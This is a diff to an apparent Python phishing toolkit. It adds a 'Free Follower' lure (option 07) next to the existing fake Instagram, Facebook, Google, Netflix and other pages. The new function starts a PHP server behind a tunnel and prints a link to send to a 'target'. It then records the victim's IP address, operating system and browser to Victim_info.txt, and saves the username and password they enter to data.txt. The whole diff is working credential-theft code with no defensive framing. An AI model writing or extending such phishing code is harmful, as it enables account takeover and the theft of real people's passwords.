@@ -123,7 +123,7 @@ banner.banner()
 #choices====================================================================================================
 print(f""" 
 
-{Fore.RED}[{Fore.LIGHTGREEN_EX}01{Fore.RED}]{Fore.LIGHTWHITE_EX} Instagram    {Fore.RED}[{Fore.LIGHTGREEN_EX}02{Fore.RED}]{Fore.LIGHTWHITE_EX} Facebook    {Fore.RED}[{Fore.LIGHTGREEN_EX}03{Fore.RED}]{Fore.LIGHTWHITE_EX} Github  
+{Fore.RED}[{Fore.LIGHTGREEN_EX}01{Fore.RED}]{Fore.LIGHTWHITE_EX} Instagram    {Fore.RED}[{Fore.LIGHTGREEN_EX}02{Fore.RED}]{Fore.LIGHTWHITE_EX} Facebook    {Fore.RED}[{Fore.LIGHTGREEN_EX}03{Fore.RED}]{Fore.LIGHTWHITE_EX} Github   {Fore.RED}[{Fore.LIGHTGREEN_EX}07{Fore.RED}]{Fore.LIGHTWHITE_EX} Free Follower
 
 {Fore.RED}[{Fore.LIGHTGREEN_EX}04{Fore.RED}]{Fore.LIGHTWHITE_EX} Netflix      {Fore.RED}[{Fore.LIGHTGREEN_EX}05{Fore.RED}]{Fore.LIGHTWHITE_EX} Google      {Fore.RED}[{Fore.LIGHTGREEN_EX}06{Fore.RED}]{Fore.LIGHTWHITE_EX} Pubg
 
@@ -943,6 +943,142 @@ def Pubg():
         subprocess.call("sudo pkill php" , stdout=subprocess.DEVNULL , shell=True)
         sys.exit()
     
+#option 7====================================================================================================
+def follower():
+    global port
+    
+    path = os.getcwd()
+    os.chdir(rf"{path}/Freefollower")
+
+#====================================================================================================
+    try:
+        port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open {Fore.BLUE}({Fore.YELLOW}Default 80{Fore.BLUE}) {Fore.GREEN}⮞ " + Fore.RESET))
+        if port > 65535:
+            exit(f"""{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} Port must be less than {Fore.GREEN}65536""" + Fore.RESET)
+
+       
+    except KeyboardInterrupt:
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+    except EOFError:
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+    
+    except ValueError:
+        exit(f"""{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")
+#====================================================================================================
+    php_server()
+    
+    sleep(1)
+
+    loaclhost()
+    
+    try:
+        print(" ")
+        rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
+    except KeyboardInterrupt:
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+        
+    print("                          " , end="\r")
+#====================================================================================================
+
+    line = linecache.getline(r"localhost.txt" , 24)
+    print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
+    sleep(0.1)
+    linecache.clearcache()
+    
+    Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
+    
+#Write info====================================================================================================
+    try:
+        while True:
+            size = os.stat("info.json")
+            if size.st_size != 0:
+
+                
+                with open("info.json", "r") as read_file:
+                    data = json.load(read_file)
+
+                    print(Fore.CYAN + "\r\nTarget Ip :" , data["dev"][0]["Os-Ip"])
+                    print("\r\nOs Name :" , data["dev"][0]["Os-Name"])
+                    print("\r\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
+                    
+                    sleep(0.3)
+                    print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Other info's in Victim_info.txt" + Fore.RESET)
+                    
+                    sleep(1)
+                    df = pd.read_json(r"info.json")
+                    sleep(1)
+                    df.to_csv("Victim_info.txt", index=False , mode="a")
+
+                    victim_file= open("Victim_info.txt", "a")
+                    victim_file.write("\n")
+                    sleep(3)
+                    open("info.json" , "w").close()
+                    victim_file.close()
+
+                    
+                    Sprint(Fore.YELLOW + "\r\nWaiting for target info...".title() + Fore.RESET)
+                    break
+
+    except KeyboardInterrupt:
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+    
+#write username====================================================================================================
+    while True:
+        size = os.stat("username_key.txt")
+        if size.st_size != 0:
+            with open("username_key.txt" , "r") as user:
+                sleep(10)
+                print(f"\r\n\n{Fore.GREEN}The username is : {Fore.LIGHTWHITE_EX}" , user.read())
+
+                #clear username.txt file
+                username =open("username_key.txt")  
+                data = open("data.txt","a")
+                for x in username.readlines():
+                    data.write(f"\nThe Username is : {x}")
+                sleep(1.5)
+                open("username_key.txt" , "w").close()
+                
+                break
+#write password====================================================================================================
+
+    while True:
+        size = os.stat("password_key.txt")
+        if size.st_size != 0:
+            with open("password_key.txt" , "r") as pas:
+                sleep(15)
+                print(f"\r{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
+
+                #clear password.txt
+                pwd =open("password_key.txt")  
+                data = open("data.txt","a")
+                for x in pwd.readlines():
+                    data.write(f"\nThe Password is : {x}")
+                    data.write("\n")
+                data.close()
+                sleep(1.5)
+                open("password_key.txt" , "w").close()
+                
+                sleep(0.5)
+                print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Username and Password saved in data.txt" + Fore.RESET)
+
+                break
+
+#kill php proccess and exit====================================================================================================
+
+    if os.name == "nt":
+        subprocess.call("taskkill /F /IM php*" , stdout=subprocess.DEVNULL , shell=True)
+        sys.exit()
+    else:
+        subprocess.call("sudo pkill php" , stdout=subprocess.DEVNULL , shell=True)
+        sys.exit()
+
+  
 #Run functions ====================================================================================================
 if ask == "0":
     zero_exit()
@@ -969,6 +1105,9 @@ if ask == "5" or ask == "05":
 
 if ask == "6" or ask == "06":
     Pubg()
+    
+if ask == "7" or ask == "07":
+    follower()
     
 if ask == "xx" or ask == "XX":
     clear()
